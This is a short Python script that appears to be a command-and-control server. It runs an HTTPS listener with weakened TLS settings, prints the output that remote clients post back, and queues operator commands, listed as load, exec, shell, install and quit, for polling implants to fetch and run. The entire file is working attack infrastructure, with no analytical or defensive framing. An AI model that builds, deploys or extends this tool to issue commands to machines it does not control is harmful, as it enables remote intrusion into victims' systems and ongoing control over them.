import http.server
import ssl
import threading
import sys

CURRENT_POST = b""
STDOUT_O = sys.stdout

def get_ssl_context(certfile, keyfile):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain(certfile, keyfile)
    context.set_ciphers("@SECLEVEL=1:ALL")
    return context


class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        global CURRENT_POST
        global STDOUT_O
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        received = post_data.decode()
        if (received != "none"):
            # (sys.stdout,tmp) = (STDOUT_O,sys.stdout)
            # print(received)
            # sys.stdout = tmp
            _ = STDOUT_O.write(received + "\n> ")
        # Send response back to client
        response = CURRENT_POST
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)
        CURRENT_POST = b""

def serve_http():
    server_address = ("127.0.0.1", 443)
    httpd = http.server.HTTPServer(server_address, MyHandler)
    
    context = get_ssl_context("cert.pem", "key.pem")
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    print("Starting HTTP server on https://127.0.0.1:443")
    sys.stdout = open("stdout.log", "w")
    sys.stderr = open("stderr.log", "w")
    httpd.serve_forever()

def command_loop():
    global CURRENT_POST
    while True:
        STDOUT_O.write("Commands Available: load exec shell install quit\n> ")
        check = input("").encode() + b' '
        if len(check) > 1:
            CURRENT_POST = check

if __name__ == '__main__':
    # Create a thread for HTTP server
    http_thread = threading.Thread(target=serve_http)
    http_thread.daemon = True  # Daemonize the thread so it will be killed when the main program exits
    http_thread.start()
    command_loop()
    
